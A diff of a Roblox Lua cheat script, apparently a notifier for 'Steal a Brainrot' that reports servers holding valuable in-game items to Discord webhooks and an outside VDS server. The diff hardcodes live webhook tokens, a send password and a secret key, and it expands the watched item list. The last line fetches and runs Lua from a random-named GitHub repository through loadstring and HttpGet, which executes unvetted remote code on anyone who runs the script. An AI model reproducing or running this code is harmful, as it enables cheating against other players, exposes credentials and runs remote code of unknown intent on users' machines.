@@ -1,4 +1,3 @@
-
 local Players = game:GetService('Players')
 local UserInputService = game:GetService('UserInputService')
 local HttpService = game:GetService('HttpService')
@@ -8,11 +7,11 @@ local Workspace = game:GetService("Workspace")
 local localPlayer = Players.LocalPlayer
 
 -- 🔒 VDS SEND PASSWORD (только для отправки)
-local VDS_SEND_PASSWORD = "send_gjg4jgj44fd3233"
+local VDS_SEND_PASSWORD = "send_546564reaqw452151523333"
 local VDS_URL = "https://auroranotifier.pro"
 
 -- 🔐 KONVEER JOBID ENCRYPTION (только для VDS)
-local SECRET = "KHE6HO65O6O50"
+local SECRET = "g45hAT436262155453"
 
 local function newTable(n)
     return table.create and table.create(n) or {}
@@ -56,7 +55,7 @@ end
 -- ⚙️ WEBHOOK SETTINGS BY INCOME RANGE
 local WEBHOOKS = {
 { -- 1M/s - 25M/s
-url = '',
+url = 'https://discord.com/api/webhooks/1454372752034365566/EmLdd5U_wxp6Ziy8gAAiGB7MHpeWPaDBZzS8vfAQSD2dWsB0ZyPAEfDYK0n869ObblnT',
 title = '🟢 Low Income (1-25M/s)',
 color = 0x00ff00,
 min = 1_000_000,
@@ -65,7 +64,7 @@ sendServerInfo = false,
 sendTeleport = true
 },
 { -- 26M/s - 100M/s (основной, без Server Info)
-url = '',
+url = 'https://discord.com/api/webhooks/1456399330662682714/1HTEJNBTO1qhXMex8-5YBB1_Q5ekmyHtgvUJ886zitqpl6IC_aXhjKb5QgpjXns1s4uh',
 title = '🟡 Medium Income (26-100M/s)',
 color = 0xffff00,
 min = 26_000_000,
@@ -75,7 +74,7 @@ sendTeleport = false,
 showJoinerAd = true
 },
 { -- 101M/s - 10000M/s (основной, без Server Info)
-url = '',
+url = 'https://discord.com/api/webhooks/1456399389336801463/kyZ8kGtNnSL3Ee1YJteiCWdKWA_KlVFdUNEVAAWr9_kkwGJc6r-3Xg7D8w56aUxRfa1q',
 title = '🔴 High Income (101M+ /s)',
 color = 0xff0000,
 min = 101_000_000,
@@ -85,7 +84,7 @@ sendTeleport = false,
 showJoinerAd = true
 },
 { -- Special brainrots + overpay
-url = 'https://discord.com/api/webhooks/1454364236074717244/OFfPkCoZyUIoEG0vtKRRSCyWNyeIXFeHbGR2QthO8VrRB-WTbBVIW-LkO60y_JDKGQ9b',
+url = 'https://discord.com/api/webhooks/1454624672078630982/eqhtVZ9JOeJnnxVzWyubzrceo46OfCMGhJ4zhQLRt5aZJb9E7F63U2X8s7iKd4EoK-Rp',
 title = '⭐️ SPECIAL BRAINROTS',
 color = 0xff00ff,
 special = true,
@@ -96,18 +95,61 @@ sendTeleport = true
 
 -- 📋 SPECIAL BRAINROTS WITH MIN VALUES
 local SPECIAL_BRAINROTS = {
+['Garama and Madundung'] = 0,
 ['Dragon Cannelloni'] = 0,
+['La Supreme Combinasion'] = 0,
+['Ketupat Kepat'] = 315_000_000,
 ['Strawberry Elephant'] = 0,
+['Ketchuru and Musturu'] = 255_000_000,
+['Tralaledon'] = 100_000_000,
+['Tictac Sahur'] = 250_000_000,
+['Burguro And Fryuro'] = 0,
+['La Secret Combinasion'] = 0,
+['Spooky and Pumpky'] = 0,
 ['Meowl'] = 0,
+['La Casa Boo'] = 0,
 ['Headless Horseman'] = 0,
+['Los Tacoritas'] = 0,
+['Capitano Moby'] = 0,
+['Cooki and Milki'] = 0,
+['Fragrama and Chocrama'] = 0,
+['Guest 666'] = 0,
+['Fishino Clownino'] = 0,
+['Tacorita Bicicleta'] = 250_000_000,
+['La Jolly Grande'] = 350_000_000,
+['W or L'] = 390_000_000,
+['Los Puggies'] = 400_000_000,
+['La Taco Combinasion'] = 450_000_000,
+['Chipso and Queso'] = 260_000_000,
+['Mieteteira Bicicleteira'] = 500_000_000,
+['Los Mobilis'] = 500_000_000,
+['La Spooky Grande'] = 300_000_000,
+['Eviledon'] = 400_000_000,
+['Chillin Chili'] = 25_000_000,
+['Money Money Puggy'] = 210_000_000,
+['Tang Tang Keletang'] = 260_000_000,
+['Los Primos'] = 0,
+['Orcaledon'] = 320_000_000,
+['Las Sis'] = 300_000_000,
+['La Extinct Grande'] = 300_000_000,
+['Los Bros'] = 280_000_000,
+['Spaghetti Tualetti'] = 420_000_000,
+['Esok Sekolah'] = 450_000_000,
+['Nuclearo Dinossauro'] = 250_000_000,
+['Lavadorito Spinito'] = 250_000_000,
+['La Ginger Sekolah'] = 225_000_000,
+['Reinito Sleighito'] = 0,
 ['Dragon Gingerini'] = 0,
+['Festive 67'] = 0,
+['Ginger Gerat'] = 0,
+['Jolly Jolly Sahur'] = 0,
 ['Skibidi Toilet'] = 0,
 }
 
 -- 🎮 OBJECTS WITH EMOJIS AND IMPORTANCE
 local OBJECTS = {
 ['La Vacca Saturno Saturnita'] = { emoji = '🐄', important = false },
-['Chimpanzini Spiderini'] = { emoji = '🕷', important = false },
+['Chimpanzini Spiderini'] = { emoji = '🕷️', important = false },
 ['Los Tralaleritos'] = { emoji = '🎵', important = false },
 ['Las Tralaleritas'] = { emoji = '🎶', important = false },
 ['Graipuss Medussi'] = { emoji = '🐍', important = false },
@@ -120,7 +162,7 @@ local OBJECTS = {
 ['Nuclearo Dinossauro'] = { emoji = '☢️', important = true },
 ['Las Vaquitas Saturnitas'] = { emoji = '🐮', important = false },
 ['Agarrini la Palini'] = { emoji = '🤹', important = false },
-['Los Hotspotsitos'] = { emoji = '⚡️', important = true },
+['Los Hotspotsitos'] = { emoji = '⚡', important = true },
 ['Esok Sekolah'] = { emoji = '🏫', important = true },
 ['Nooo My Hotspot'] = { emoji = '📶', important = false },
 ['La Supreme Combinasion'] = { emoji = '👑', important = true },
@@ -141,7 +183,7 @@ local OBJECTS = {
 ['Tang Tang Keletang'] = { emoji = '🥁', important = true },
 ['Money Money Puggy'] = { emoji = '💰', important = true },
 ['Burguro And Fryuro'] = { emoji = '🍔', important = true },
-['Chillin Chili'] = { emoji = '🌶', important = true },
+['Chillin Chili'] = { emoji = '🌶️', important = true },
 ['Eviledon'] = { emoji = '😈', important = true },
 ['La Spooky Grande'] = { emoji = '👻', important = true },
 ['Los Mobilis'] = { emoji = '🚗', important = true },
@@ -153,7 +195,7 @@ local OBJECTS = {
 ['Headless Horseman'] = { emoji = '👹', important = true },
 ['Mariachi Corazoni'] = { emoji = '🎺', important = true },
 ['La Taco Combinasion'] = { emoji = '🌮', important = true },
-['Capitano Moby'] = { emoji = '⚓️', important = true },
+['Capitano Moby'] = { emoji = '⚓', important = true },
 ['Guest 666'] = { emoji = '🔥', important = true },
 ['Cooki and Milki'] = { emoji = '🍪', important = true },
 ['Los Puggies'] = { emoji = '🐶', important = true },
@@ -767,4 +809,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Confilas/ghjnfthun/refs/heads/main/fvddfv"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dsfsdfs21cfc/yrhgnjrtyjh333/refs/heads/main/g5hg45yhhop.lua"))()
